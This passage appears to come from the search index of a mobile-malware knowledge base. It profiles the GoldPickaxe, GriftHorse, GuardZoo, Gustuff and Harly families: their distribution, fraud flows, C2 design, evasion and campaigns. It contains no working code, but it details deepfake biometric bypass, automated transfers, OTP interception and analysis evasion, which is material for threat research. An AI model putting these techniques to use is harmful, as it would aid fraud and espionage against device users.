recordings from victims, which operators use to generate deepfake content that bypasses facial recognition verification at banks. Notably, GoldPickaxe includes both Android and iOS variants, making it one of the few mobile banking trojan families with true cross-platform reach.</p> <p>The ESET H1 2024 Threat Report references the family under the \"GoldDigger/GoldFactory\" designation, tracking its evolution and expanding geographic scope.</p>"},{"location":"malware/families/goldpickaxe/#distribution","title":"Distribution","text":"Vector Details Localized apps Malicious apps disguised as local government or utility services Social engineering Victims contacted directly and guided to install apps Smishing SMS messages directing victims to download pages iOS profiles Enterprise or MDM profiles used to sideload iOS variants <p>GoldPickaxe distribution relies heavily on social engineering tailored to specific markets. In Thailand, lures impersonate government services such as the Digital Pension app. In Vietnam, distribution uses local utility and banking app impersonations. The operators contact victims directly through messaging platforms, posing as government officials or bank representatives, and guide them through the installation process.</p> <p>The iOS distribution is particularly notable. Since iOS does not allow sideloading in the same way Android does, the operators use enterprise distribution profiles or mobile device management (MDM) configurations to install the malicious app outside the App Store. Victims are socially engineered into accepting the profile installation, which then enables the trojan deployment.</p>"},{"location":"malware/families/goldpickaxe/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/goldpickaxe/#core-features","title":"Core Features","text":"Capability Implementation Facial biometric theft Prompts victim to record facial video, exfiltrates for deepfake creation Identity document theft Captures photos of government-issued ID documents SMS interception Reads and exfiltrates SMS messages for OTP and 2FA bypass Overlay attacks WebView-based inject screens for credential harvesting Device information collection Harvests device model, phone number, and installed apps Proxy traffic Routes traffic through victim device to mask operator's origin"},{"location":"malware/families/goldpickaxe/#biometric-theft-and-deepfake-bypass","title":"Biometric Theft and Deepfake Bypass","text":"<p>GoldPickaxe's signature capability is its approach to defeating facial recognition verification. Many Southeast Asian banks, particularly in Thailand and Vietnam, have implemented face-verification systems that require customers to record a short video of their face when initiating high-value transactions or account changes. GoldPickaxe exploits this by:</p> <ol> <li>Displaying a convincing prompt within the malicious app requesting the victim to record a facial video, framed as an identity verification step</li> <li>Capturing the recorded video and exfiltrating it to the operator's infrastructure</li> <li>Using AI-powered face-swapping tools to generate deepfake videos from the stolen biometric data</li> <li>Presenting the deepfake video to the bank's face-verification system to authorize fraudulent transactions</li> </ol> <p>This technique is fundamentally different from how other banking trojans like Chameleon interact with biometric security. Chameleon disables biometric authentication on the device (forcing a fallback to PIN or password, which it captures through keylogging), while GoldPickaxe steals the biometric data itself and uses it to impersonate the victim at the bank's verification layer. The distinction is between bypassing biometric checks locally versus defeating them at the server side through stolen biometric material.</p>"},{"location":"malware/families/goldpickaxe/#identity-document-theft","title":"Identity Document Theft","text":"<p>Beyond facial biometrics, GoldPickaxe also prompts victims to photograph their government-issued ID documents. Combined with the facial video, this gives operators a comprehensive identity package: a face video for deepfake generation, document photos for identity verification questions, and personal details extracted from the documents.</p>"},{"location":"malware/families/goldpickaxe/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/goldpickaxe/#cross-platform-architecture","title":"Cross-Platform Architecture","text":"<p>GoldPickaxe is one of the rare mobile banking trojan families with functional variants on both Android and iOS:</p> Platform Distribution Method Key Differences Android Sideloaded APKs, localized app stores Full feature set including accessibility service abuse iOS Enterprise profiles, MDM configurations, TestFlight (initially) More limited due to iOS restrictions, focused on biometric and document theft <p>The iOS variant was initially distributed through Apple's TestFlight beta testing platform before Apple removed it. The operators then shifted to enterprise distribution profiles and MDM-based installation.</p>"},{"location":"malware/families/goldpickaxe/#anti-analysis","title":"Anti-Analysis","text":"Technique Details Localized targeting Highly regional lures make samples harder to discover outside target geographies Social engineering dependency Installation requires active victim participation, limiting automated sandbox detection Enterprise profile abuse iOS distribution through profiles rather than App Store avoids standard app review"},{"location":"malware/families/goldpickaxe/#target-regions","title":"Target Regions","text":"Period Primary Targets 2023 Vietnam (GoldDigger) 2023-2024 Vietnam, Thailand (GoldDiggerPlus, GoldPickaxe) 2024 Expanded to Latin America, South Africa <p>The initial focus on Vietnamese and Thai banking users reflects the group's expertise in Southeast Asian markets. The adoption of facial verification by banks in these countries created the specific opportunity that GoldPickaxe was designed to exploit. Expansion into Latin America and South Africa follows the trend of successful mobile banking trojan operations extending beyond their initial geographic focus once the tooling matures.</p>"},{"location":"malware/families/goldpickaxe/#notable-campaigns","title":"Notable Campaigns","text":"<p>2023: GoldDigger campaigns targeted Vietnamese banking users through localized app lures, establishing the GoldFactory group's operational footprint in Southeast Asia.</p> <p>Early 2024: GoldPickaxe emerged with facial biometric theft capabilities targeting Thai and Vietnamese banks. The iOS variant was distributed through TestFlight before Apple intervened, after which operators pivoted to enterprise profile distribution.</p> <p>Mid-2024: The ESET H1 2024 Threat Report documented the GoldDigger/GoldFactory family's evolution and expanding scope, noting the biometric theft technique as a significant development in mobile banking fraud.</p> <p>Late 2024: Campaigns expanded beyond Southeast Asia into Latin American and South African markets, targeting banking customers in regions where facial verification is gaining adoption.</p>"},{"location":"malware/families/goldpickaxe/#related-families","title":"Related Families","text":"Family Relationship GoldDigger Direct predecessor within the GoldFactory family. Android banking trojan targeting Vietnamese banks, lacking biometric theft capability. GoldDiggerPlus Android sibling variant with enhanced features including real-time voice communication with victims during active compromise. Chameleon Both families interact with biometric security, but through opposite approaches. Chameleon disables biometric authentication locally to force PIN/password fallback. GoldPickaxe steals biometric data to defeat server-side face verification through deepfakes."},{"location":"malware/families/goldpickaxe/#references","title":"References","text":""},{"location":"malware/families/grifthorse/","title":"GriftHorse","text":"<p>GriftHorse is a premium SMS fraud trojan that infected over 10 million Android devices across 70+ countries between November 2020 and September 2021, generating estimated revenue in the hundreds of millions of euros. Discovered by Zimperium zLabs, the campaign stood out for its scale, geographic reach, and operational discipline: operators used geolocation-based targeting to serve country-specific premium service numbers, avoided hardcoded URLs, rotated domains, and built their apps with Apache Cordova to enable seamless silent updates.</p>"},{"location":"malware/families/grifthorse/#overview","title":"Overview","text":"Attribute Details First Seen November 2020 Last Seen September 2021 (Google Play removal) Type Premium SMS subscription fraud Attribution Unknown Aliases GriftHorse"},{"location":"malware/families/grifthorse/#origin-and-lineage","title":"Origin and Lineage","text":"<p>GriftHorse has no known code lineage to other Android malware families. It was purpose-built for premium SMS enrollment at scale. The Zimperium zLabs team discovered the campaign through automated alerts from their z9 on-device detection engine. Forensic analysis placed the campaign's start date at November 2020, meaning it operated undetected for approximately 10 months before public disclosure.</p> <p>The operators showed significant investment in infrastructure and distribution. Over 200 trojanized apps were submitted to Google Play and third-party stores, each functional enough to accumulate downloads without raising review flags. The campaign's financial model was straightforward: subscribe victims to premium SMS services charging approximately 36 euros per month, charged directly to their phone bill.</p>"},{"location":"malware/families/grifthorse/#distribution","title":"Distribution","text":"<p>GriftHorse used two distribution channels:</p> Channel Details Google Play 200+ trojanized apps across multiple categories Third-party stores Same apps distributed through alternative app markets"},{"location":"malware/families/grifthorse/#app-categories","title":"App Categories","text":"<p>The trojanized apps spanned a wide range of categories to maximize installs:</p> Category Examples Tools/Utilities File managers, compasses, GPS tools Entertainment Horoscope apps, wallpapers Dating Chat and dating simulation apps Music Ringtone and audio apps Games Casual puzzle and arcade games Productivity Translators, calculators Communication Call recorders, messaging <p>The apps were functional. Users received a working utility while the fraud operated silently. This dual-purpose design kept ratings positive and avoided mass uninstalls that would trigger Play Store review.</p>"},{"location":"malware/families/grifthorse/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/grifthorse/#fraud-flow","title":"Fraud Flow","text":"Step Action 1 User installs trojanized app from Google Play or third-party store 2 App begins displaying pop-up alerts claiming the user has won a prize 3 Pop-ups repeat at minimum 5 times per hour until the user interacts 4 User taps alert, app collects device IP for geolocation 5 Based on IP geolocation, app serves a country-specific premium service page 6 Page prompts user to enter phone number for \"verification\" 7 Submitted phone number is enrolled in a premium SMS service (~36 EUR/month) 8 Charges appear on victim's phone bill <p>The social engineering relied on persistence rather than sophistication. The pop-ups were intentionally aggressive, appearing repeatedly until the user engaged, betting that a fraction of annoyed users would follow through.</p>"},{"location":"malware/families/grifthorse/#geolocation-targeting","title":"Geolocation Targeting","text":"<p>GriftHorse's operators served different premium service numbers based on the victim's IP-derived country. This meant:</p> <ul> <li>Each country received premium numbers that actually worked with local carriers</li> <li>No single premium service number appeared across all regions, complicating detection</li> <li>The payload URL was not hardcoded but dynamically served, so static analysis of the APK revealed nothing malicious</li> </ul>"},{"location":"malware/families/grifthorse/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/grifthorse/#framework","title":"Framework","text":"<p>GriftHorse apps were built with Apache Cordova, a cross-platform mobile development framework that wraps web technologies (HTML5, CSS3, JavaScript) in a native container. See Cordova / Ionic / Capacitor for the reverse engineering methodology. The choice of Cordova provided several operational advantages:</p> Advantage Details Cross-platform Same codebase runs on Android (and could be adapted for iOS) Silent updates Cordova's web layer can be updated without pushing an app store update Rapid development Web technologies allow fast iteration across 200+ app variants InAppBrowser Cordova's InAppBrowser plugin opens subscription pages within the app context"},{"location":"malware/families/grifthorse/#c2-architecture","title":"C2 Architecture","text":"Component Details Stage 1 App contains encrypted C2 URL in its assets Decryption AES decryption to recover stage-2 C2 URL Stage 2 GET request to stage-2 URL retrieves the premium service page URL Serving Premium page URL is country-specific, resolved via IP geolocation Display Page opened in Cordova's InAppBrowser <p>The operators avoided hardcoding any premium service URLs in the APK. The two-stage C2 retrieval with AES encryption and IP-based filtering meant the malicious behavior was invisible to static analysis and only triggered for users in targeted regions.</p>"},{"location":"malware/families/grifthorse/#domain-infrastructure","title":"Domain Infrastructure","text":"<p>Operators rotated domains frequently and avoided reusing domains across campaigns. No single domain appeared in multiple app variants, which made domain-based blocklisting ineffective as a broad countermeasure. The IP-based geolocation filtering also meant security researchers in non-targeted countries would receive benign responses from the C2.</p>"},{"location":"malware/families/grifthorse/#evasion","title":"Evasion","text":"Technique Purpose AES-encrypted C2 URL Prevents static extraction of server addresses IP geolocation filtering Non-targeted regions receive no malicious payload Domain rotation No persistent indicators for blocklist-based detection Cordova framework Malicious logic lives in the web layer, not in Dalvik bytecode Functional apps Positive reviews and high ratings reduce suspicion No SEND_SMS permission Fraud is web-based, not through SMS API; no suspicious permissions in manifest"},{"location":"malware/families/grifthorse/#target-regions","title":"Target Regions","text":"<p>GriftHorse targeted over 70 countries. The geolocation-based serving model meant any country with carrier-billed premium SMS services was a potential target.</p> Region Selected Countries Europe UK, Germany, France, Spain, Italy, Greece, Poland, Norway, Sweden, Finland Asia India, China, Thailand, Malaysia, Indonesia, Saudi Arabia, UAE Americas US, Brazil, Canada, Argentina Africa South Africa, Nigeria, Egypt, Kenya Oceania Australia, New Zealand <p>The campaign's profitability depended on local carrier billing infrastructure. Countries where phone bill charges for premium services are common and difficult to reverse were prioritized.</p>"},{"location":"malware/families/grifthorse/#notable-campaigns","title":"Notable Campaigns","text":"<p>2020, November: GriftHorse campaign begins. Trojanized apps start appearing on Google Play and third-party stores. The operation runs silently, accumulating installs across multiple app categories and regions.</p> <p>2021, ongoing: The campaign scales to 200+ apps and 10M+ infected devices globally. Estimated revenue reaches hundreds of millions of euros at ~36 EUR per victim per month. The aggressive pop-up social engineering drives a steady conversion rate across targeted populations.</p> <p>2021, September: Zimperium zLabs publishes their discovery, revealing the full scope: 10M+ victims, 70+ countries, 200+ apps. Google verifies the findings and removes all identified apps from the Play Store. Coverage by Threatpost, Dark Reading, The Record, and Malwarebytes follows.</p> <p>2021, post-disclosure: While removed from Google Play, the apps remained available on third-party app stores. Victims already enrolled in premium services continued to be charged until they manually contacted their carrier to cancel. No arrests or infrastructure seizures have been publicly reported. Kaspersky's subscription trojan comparison documented GriftHorse's subscription mechanics alongside Joker, MobOk, and Vesub.</p>"},{"location":"malware/families/grifthorse/#references","title":"References","text":""},{"location":"malware/families/guardzoo/","title":"GuardZoo","text":"<p>GuardZoo is an Android surveillanceware operated by a Houthi-aligned threat actor, targeting military personnel across the Middle East since October 2019. Lookout disclosed the campaign in July 2024, identifying over 450 unique victim IP addresses primarily in Yemen, Saudi Arabia, Egypt, Oman, the UAE, Qatar, and Turkey. GuardZoo is built on Dendroid RAT, an open-source Android RAT whose source code was leaked publicly in 2014. The operators heavily modified Dendroid's codebase, adding over 60 new commands, replacing the original PHP web panel with a custom ASP.NET backend, and tailoring the collection priorities toward military intelligence: the malware automatically uploads all KMZ, WPT, RTE, and TRK files (map data, waypoints, routes, tracks) from the device without requiring a specific command.</p>"},{"location":"malware/families/guardzoo/#overview","title":"Overview","text":"Attribute Details First Seen October 2019 Last Seen Active as of July 2024 Status Active Type Surveillanceware, military espionage Attribution Houthi-aligned Yemeni threat actor Distribution WhatsApp, WhatsApp Business, direct browser download"},{"location":"malware/families/guardzoo/#origin-and-lineage","title":"Origin and Lineage","text":"<p>GuardZoo descends directly from Dendroid RAT, a commodity Android RAT that was leaked online in 2014. Dendroid offered basic remote access capabilities and was widely used by low-sophistication actors due to its open-source availability. GuardZoo's operators took the Dendroid codebase and performed extensive modifications: unused functions were stripped out, new surveillance commands were added (expanding the command set to over 60), and the entire C2 backend was rebuilt.</p> <p>The most significant infrastructure change was replacing Dendroid's original PHP web panel with a custom C2 built on ASP.NET, served through IIS 10. Despite this rebuild, the C2 URLs retain \".php\" extensions in their paths, a remnant of the Dendroid heritage. Communication between the implant and C2 occurs over HTTPS, though the request body data is transmitted in cleartext.</p> <p>Lookout had been tracking Dendroid RAT since before 2022, which led to the identification of GuardZoo as a distinct fork with purpose-built military intelligence collection capabilities.</p>"},{"location":"malware/families/guardzoo/#distribution","title":"Distribution","text":"<p>GuardZoo spreads primarily through WhatsApp and WhatsApp Business, with secondary distribution via direct browser downloads. The lure apps use military and religious themes designed to appeal to armed forces personnel in the target region.</p> Vector Details WhatsApp / WhatsApp Business Primary distribution channel; APKs shared in chats and groups Direct browser download Secondary vector; victims directed to download pages Military-themed lures Apps named \"Constitution of the Armed Forces,\" \"Limited, Commander and Staff,\" \"Restructuring of the New Armed Forces\" Religious-themed lures Prayer and Islamic content apps used as secondary themes E-book lures Apps disguised as military reference e-books"},{"location":"malware/families/guardzoo/#attack-flow","title":"Attack Flow","text":"<ol> <li>Target receives a WhatsApp message containing or linking to a military-themed app (training manuals, armed forces reference materials, or religious content)</li> <li>Target downloads and installs the APK</li> <li>GuardZoo connects to the C2 server and registers the device</li> <li>By default, the malware immediately begins uploading all KMZ, WPT, RTE, and TRK files created since June 24, 2017</li> <li>The operator issues additional commands from the 60+ command set for targeted data collection</li> <li>The operator can deploy additional malware to the device through GuardZoo's download capability</li> </ol> <p>The WhatsApp distribution is particularly effective in the target environment. Military personnel in the region commonly share documents and apps through WhatsApp groups, making a military-themed app shared by a colleague or in a unit group chat a highly credible lure.</p>"},{"location":"malware/families/guardzoo/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/guardzoo/#core-features","title":"Core Features","text":"Capability Implementation Map/GPS file collection Automatically uploads KMZ, WPT, RTE, TRK files (waypoints, routes, tracks, map overlays) created since June 2017 Photo exfiltration Collects photos from the device Document theft Extracts documents and files from storage Location tracking Captures device GPS coordinates Device profiling Reports device model, cellular carrier, Wi-Fi configuration Additional malware deployment Can download and install further payloads on the compromised device Over 60 C2 commands Extensive remote control via custom command set"},{"location":"malware/families/guardzoo/#military-intelligence-focus","title":"Military Intelligence Focus","text":"<p>The automatic collection of mapping files is GuardZoo's defining feature from an intelligence perspective. KMZ files (Keyhole Markup Language, compressed) contain geographic annotations, map overlays, and location markers. WPT (waypoint), RTE (route), and TRK (track) files store GPS navigation data. For military personnel, these files represent operational planning data: patrol routes, checkpoint locations, base coordinates, and movement patterns.</p> <p>The default collection threshold of files created since June 24, 2017 means GuardZoo sweeps up years of accumulated geographic data on first infection, providing the operator with historical military movement patterns in addition to current operational data.</p>"},{"location":"malware/families/guardzoo/#c2-architecture","title":"C2 Architecture","text":"Component Details Backend Custom ASP.NET application on IIS 10 Protocol HTTPS (transport encryption), cleartext request body Legacy artifacts URL paths retain \".php\" extensions from Dendroid heritage Command set Over 60 distinct commands <p>The cleartext request body over HTTPS means that while the transport layer is encrypted, the data structure itself is not obfuscated. Any operator with access to the C2 server sees raw data. This suggests the operators prioritized functional C2 over layered encryption, consistent with the modified commodity RAT approach.</p>"},{"location":"malware/families/guardzoo/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/guardzoo/#dendroid-modifications","title":"Dendroid Modifications","text":"<p>GuardZoo's operators made substantial changes to the Dendroid RAT source:</p> Aspect Dendroid RAT (Original) GuardZoo (Modified) C2 backend PHP web panel Custom ASP.NET on IIS 10 Command set Basic RAT commands Over 60 commands Auto-collection None Automatic KMZ/WPT/RTE/TRK upload Unused functions Full Dendroid feature set Stripped to reduce footprint Target profile Generic Military personnel"},{"location":"malware/families/guardzoo/#file-extension-targeting","title":"File Extension Targeting","text":"<p>The automatic collection targets specific file extensions used by GPS and mapping applications:</p> Extension Data Type KMZ Google Earth data (compressed KML), contains placemarks, overlays, geographic annotations WPT Waypoint files, GPS coordinate markers for specific locations RTE Route files, ordered sequences of waypoints defining a path TRK Track files, recorded GPS movement logs showing actual traveled paths <p>These file types are commonly generated by military GPS devices, mapping applications, and navigation software. Collecting them provides the operator with both planned operations (routes, waypoints) and historical movements (tracks).</p>"},{"location":"malware/families/guardzoo/#target-regions","title":"Target Regions","text":"Region Details Yemen Primary target, highest concentration of victims Saudi Arabia Significant number of military personnel targeted Egypt Military targets Oman Military targets UAE Military targets Qatar Military targets Turkey Military targets <p>Lookout identified over 450 victim IP addresses across these countries, with the majority located in Yemen. The targeting pattern aligns with Houthi intelligence priorities: the Yemeni civil war places Houthi forces against a Saudi-led coalition that includes personnel from all the listed countries. Many identified victims appear to be members of pro-Hadi (anti-Houthi) forces.</p>"},{"location":"malware/families/guardzoo/#notable-campaigns","title":"Notable Campaigns","text":"<p>October 2019: GuardZoo operations begin. The campaign starts with military-themed lure apps distributed through WhatsApp to armed forces personnel in Yemen and neighboring countries.</p> <p>2019-2024: The campaign runs continuously for nearly five years, accumulating over 450 victims across seven Middle Eastern countries. Distribution relies on WhatsApp sharing within military circles, with lure apps regularly updated to match current military and religious themes.</p> <p>July 2024: Lookout publicly discloses GuardZoo, detailing the Dendroid RAT lineage, Houthi attribution, military targeting, and automatic GPS/mapping file collection. The research reveals one of the longest-running mobile espionage campaigns attributed to a non-state conflict actor.</p>"},{"location":"malware/families/guardzoo/#related-families","title":"Related Families","text":"<p>GuardZoo's lineage from Dendroid RAT places it in the category of modified open-source tools repurposed for targeted operations. NGate follows a similar pattern, repurposing the academic NFCGate tool for criminal use. SpyNote represents another case where a publicly available RAT builder has been adopted by actors ranging from script kiddies to focused espionage operators.</p> <p>GuardZoo's military-focused surveillance capabilities place it alongside PJobRAT, which also targets military personnel with fake apps distributed through social channels. Both families rely on social engineering for initial access, target specific professional communities, and prioritize intelligence collection over financial fraud. The key difference is GuardZoo's sustained five-year campaign duration, which far exceeds PJobRAT's operational windows.</p> <p>In terms of espionage capability, GuardZoo operates below the level of commercial spyware like Pegasus or Predator, which use exploit chains for zero-click or one-click installation. GuardZoo compensates with targeted social engineering through trusted channels (WhatsApp groups within military units), achieving access through trust rather than technical exploitation. The approach resembles AridSpy's social engineering model, where trojanized functional apps are used to gain access to specific communities.</p>"},{"location":"malware/families/guardzoo/#references","title":"References","text":""},{"location":"malware/families/gustuff/","title":"Gustuff","text":"<p>Gustuff was an Android banking trojan that pioneered Automated Transfer System (ATS) fraud through accessibility services before the technique became an industry standard. Built as an evolution of the AndyBot malware by a Russian-speaking actor known as \"Bestoffer,\" it targeted 100+ banking apps and 32 cryptocurrency wallets across the US, Europe, and Australia. Gustuff's ATS implementation, which auto-filled transfer forms inside legitimate banking apps, predated the widespread adoption of this technique by families like Anatsa and Xenomorph by several years.</p>"},{"location":"malware/families/gustuff/#overview","title":"Overview","text":"Attribute Details First Seen April 2018 Last Seen ~2020 Status Inactive Type Banking trojan, ATS fraud Aliases AndyBot (predecessor) Attribution \"Bestoffer,\" Russian-speaking actor Distribution SMS with links to fake APKs"},{"location":"malware/families/gustuff/#vendor-names","title":"Vendor Names","text":"Vendor Name Group-IB Gustuff Cisco Talos Gustuff SonicWall AndroidGustuff ESET Android/Spy.Banker Kaspersky Trojan-Banker.AndroidOS.Gustuff Trend Micro AndroidOS_Gustuff Microsoft Trojan:AndroidOS/Banker"},{"location":"malware/families/gustuff/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Gustuff first appeared on Russian-speaking underground forums in April 2018 as a subscription-based service priced at $800/month. Its author, operating under the handle \"Bestoffer,\" marketed it as an upgraded version of AndyBot, a banking trojan that had been targeting Android devices since November 2017. Where AndyBot relied on conventional web fakes to steal credentials, Gustuff introduced the ATS engine that could script transfers directly inside the real banking app's UI.</p> <p>Group-IB's Threat Intelligence team published the first detailed analysis in March 2019, highlighting the scale of Gustuff's target list and the novelty of its ATS approach. At the time, most Android banking trojans relied on overlay attacks to capture credentials, then required manual operator action to perform transfers from separate devices. Gustuff automated the entire chain on the victim's device.</p> <p>The malware saw active development through 2019, with Cisco Talos documenting a significant v2 update in October 2019 that rearchitected command handling, removed hardcoded target lists, and introduced JavaScript-based scripting. Activity declined through 2020 as newer families adopted and refined similar techniques.</p>"},{"location":"malware/families/gustuff/#distribution","title":"Distribution","text":"<p>Gustuff relied on SMS-based distribution, sending messages containing links to malicious APK files. The malware harvested contact lists from infected devices to propagate further, creating a self-spreading mechanism.</p> Campaign Vector Disguise Source Early 2019 SMS Generic banking/utility apps Group-IB April 2019 SMS Australian financial service apps Cisco Talos June 2019 SMS, social media Instagram, social media apps SonicWall October 2019 SMS Fake app updates Cisco Talos <p>SonicWall documented a campaign where Gustuff disguised itself as Instagram and other social media apps, using icons identical to the legitimate applications to deceive users during installation.</p>"},{"location":"malware/families/gustuff/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/gustuff/#version-1-2018-2019","title":"Version 1 (2018-2019)","text":"Capability Implementation ATS fraud Accessibility service auto-fills transfer forms in banking apps Overlay attacks Web fakes loaded over legitimate apps to steal credentials SMS interception Read, send, hide SMS for OTP theft Contact harvesting Exfiltrate contacts for SMS-based propagation Push notifications Display fake notifications to lure users into targeted apps Crypto wallet targeting Overlays for 32 cryptocurrency apps including Coinbase, BitPay, Bitcoin Wallet Anti-AV Maintained list of AV apps to block/disable Google Protect bypass Disable Google Play Protect on infected devices"},{"location":"malware/families/gustuff/#version-2-october-2019","title":"Version 2 (October 2019)","text":"<p>Cisco Talos's analysis of the v2 update revealed substantial architectural changes:</p> Capability Implementation JavaScript scripting engine WebChromeClient with JS interface for dynamic command execution Dynamic target loading Target app list loaded from C2 during activation rather than hardcoded Dynamic WebView injection C2 can push WebView overlays for arbitrary domains on demand Command tracking Each C2 command assigned unique ID for execution state reporting Reduced static footprint No hardcoded package names, lowering detection by static scanners AV list dynamic loading Anti-AV target list fetched during activation cycle <p>The JavaScript scripting engine was a notable advancement. By injecting a JavaScript interface into a WebView with filesystem access, operators could execute arbitrary automation scripts, combining the malware's internal commands with the flexibility of JavaScript.</p>"},{"location":"malware/families/gustuff/#ats-implementation","title":"ATS Implementation","text":"<p>Gustuff's ATS engine was its defining feature. The process:</p> <ol> <li>Victim opens legitimate banking app and authenticates</li> <li>Malware detects the active session via accessibility service monitoring</li> <li>Uses <code>ACTION_SET_TEXT</code> (Android 5.0+) or clipboard injection (older versions) to fill transfer fields</li> <li>Navigates the banking app's UI through accessibility gestures</li> <li>Submits the transfer using C2-provided recipient and amount data</li> <li>Captures and uses SMS OTP codes to authorize the transaction</li> </ol> <p>This on-device approach bypassed \"new device\" fraud checks, since the transfer originated from the victim's enrolled device within an authenticated session.</p>"},{"location":"malware/families/gustuff/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/gustuff/#c2-communication","title":"C2 Communication","text":"<p>The C2 protocol used HTTP-based polling at predetermined intervals. The bot registered with the C2 on first launch, sending device fingerprint data. The C2 responded to polls with either \"ok\" (no pending commands) or a command payload.</p> <p>Key C2 commands:</p> Command Action <code>checkApps</code> Receive target application list during activation <code>interactive</code> Use accessibility API to interact with banking app UI for ATS <code>script</code> Execute JavaScript via WebChromeClient interface <code>upload</code> Exfiltrate files from device <code>sms</code> Send SMS from victim device <code>push</code> Display push notification to lure user <code>openApp</code> Launch specified app to trigger overlay or ATS <p>In v2, commands related to SOCKS proxy functionality were removed entirely, indicating a strategic shift toward ATS-only fraud rather than proxying device traffic.</p>"},{"location":"malware/families/gustuff/#anti-analysis","title":"Anti-Analysis","text":"Technique Details Heavy obfuscation Packed and obfuscated to evade static analysis Anti-VM checks Detects emulator environments through hardware property checks Dynamic configuration Target lists, AV lists, and injects fetched from C2 rather than bundled Google Play Protect suppression Programmatically disables Play Protect on victim device"},{"location":"malware/families/gustuff/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>Gustuff's target list was extensive, covering major financial institutions and cryptocurrency services globally.</p> Region Country Banking Apps North America United States 27 apps (Bank of America, Wells Fargo, Capital One, J.P. Morgan, TD Bank, PNC Bank) Europe Poland 16 apps Europe Germany 9 apps Asia-Pacific Australia 10 apps Asia-Pacific India 8 apps <p>Beyond banking, Gustuff targeted:</p> <ul> <li>32 cryptocurrency wallets: Coinbase, BitPay, Cryptopay, Bitcoin Wallet</li> <li>Payment systems: PayPal, Western Union, Revolut</li> <li>Marketplaces: eBay, Walmart</li> <li>Messaging apps: WhatsApp, Skype</li> </ul> <p>Cisco Talos reported that the Australian-focused campaign also attempted to target the Australian Government's myGov portal, expanding beyond pure financial theft to credential harvesting for government services.</p>"},{"location":"malware/families/gustuff/#notable-campaigns","title":"Notable Campaigns","text":"<p>March 2019: Group-IB published their initial disclosure, documenting Gustuff's capability to target 100+ banking apps and 32 cryptocurrency wallets. The analysis highlighted the ATS mechanism as a significant evolution beyond traditional overlay-based credential theft.</p> <p>April 2019: Cisco Talos identified an active campaign specifically targeting Australian financial institutions and digital currency wallets. The campaign also targeted the Australian Government's myGov portal, marking an expansion into government credential theft.</p> <p>June 2019: SonicWall documented Gustuff spreading under the disguise of social media apps, including samples mimicking Instagram with pixel-identical app icons.</p> <p>October 2019: Cisco Talos published their v2 analysis, detailing the JavaScript scripting engine, dynamic target loading, and command execution tracking system that represented a substantial architectural overhaul from the original version.</p>"},{"location":"malware/families/gustuff/#references","title":"References","text":""},{"location":"malware/families/harly/","title":"Harly","text":"<p>Harly is a subscription fraud trojan distributed through the Google Play Store, identified and named by Kaspersky in 2022. With over 190 infected apps and a conservative 4.8 million downloads, Harly operates in the same toll fraud space as Joker but uses a distinct technical approach: the entire malicious payload is embedded within the APK rather than downloaded from a C2 server. The family is notable for using Rust and Go native libraries as payload loaders, a technique uncommon in Android toll fraud malware.</p>"},{"location":"malware/families/harly/#overview","title":"Overview","text":"Attribute Details First Seen 2020 Status Active Type Subscription fraud, toll fraud Attribution Unknown Aliases Harly Trojan Subscriber"},{"location":"malware/families/harly/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Kaspersky classified Harly as part of the Joker/Bread ecosystem based on functional similarity: both families silently subscribe victims to paid services through WAP billing and premium SMS. The key lineage difference is architectural. Joker variants typically act as droppers that download their payload from C2 servers at runtime. Harly embeds the complete payload within the APK itself, encrypted inside assets or native libraries, and decrypts it locally on launch.</p> <p>HUMAN Security's Satori team tracked Harly's evolution and uncovered 95 additional malicious apps on Google Play during their investigation. Their analysis revealed the threat actors behind Harly have adopted Rust and Go for the native library loaders, though their usage of these languages appears limited to payload decryption and loading rather than implementing core fraud logic.</p>"},{"location":"malware/families/harly/#distribution","title":"Distribution","text":"<p>Harly distributes exclusively through Google Play using trojanized functional apps. The operators download legitimate apps, inject malicious code, re-upload them under different developer accounts and names, and maintain the original app functionality to avoid negative reviews.</p> Attribute Details Store Google Play Store Infected apps 190+ identified Total downloads 4.8M+ (conservative estimate) App categories Games, flashlights, wallpapers, camera filters, ringtones, utilities Review evasion Apps retain original functionality; malicious behavior is silent <p>The apps function as advertised. A user who downloads a Harly-infected flashlight app gets a working flashlight. The subscription fraud occurs entirely in the background without any visible indication.</p>"},{"location":"malware/families/harly/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/harly/#subscription-fraud-flow","title":"Subscription Fraud Flow","text":"Step Action 1 App launches, native library (Rust or Go) decrypts embedded DEX payload 2 Decrypted DEX file loaded via DexClassLoader 3 Payload contacts C2 to receive subscription target list 4 Opens subscription page in invisible WebView 5 JavaScript injection auto-fills victim's phone number 6 Intercepts confirmation SMS via NotificationListenerService 7 Extracts PIN/OTP from notification or SMS 8 Submits confirmation code to complete enrollment 9 Hides confirmation notification from victim <p>Harly handles two confirmation methods:</p> <ul> <li>SMS confirmation: The <code>NotificationListenerService</code> reads the incoming verification SMS, extracts the code, and programmatically submits it</li> <li>Phone call confirmation: For services that confirm via automated call, the trojan can initiate calls to specific numbers and confirm subscriptions through the call flow</li> </ul>"},{"location":"malware/families/harly/#data-collection","title":"Data Collection","text":"Data Purpose Device info Fingerprinting for operator analytics Mobile network/carrier Determines which subscription services are available SIM MCC/MNC Country and carrier identification for targeting Installed apps Unknown, possibly for avoiding conflicts with other toll fraud malware"},{"location":"malware/families/harly/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/harly/#payload-architecture","title":"Payload Architecture","text":"<p>Unlike Joker's dropper model, Harly packages everything locally:</p> <pre><code>APK\n\u251c\u2500\u2500 lib/\n\u2502   \u2514\u2500\u2500 [arch]/\n\u2502       \u2514\u2500\u2500 libloader.so          (Rust or Go native library)\n\u251c\u2500\u2500 assets/\n\u2502   \u2514\u2500\u2500 [encrypted_payload]       (encrypted DEX file, disguised extension)\n\u2514\u2500\u2500 classes.dex                   (stub loader, minimal code)\n</code></pre> <p>The native library in <code>lib/</code> handles decryption of the asset file. Once decrypted, the result is a DEX file containing the full subscription fraud SDK. The stub <code>classes.dex</code> loads the native library and triggers decryption on app 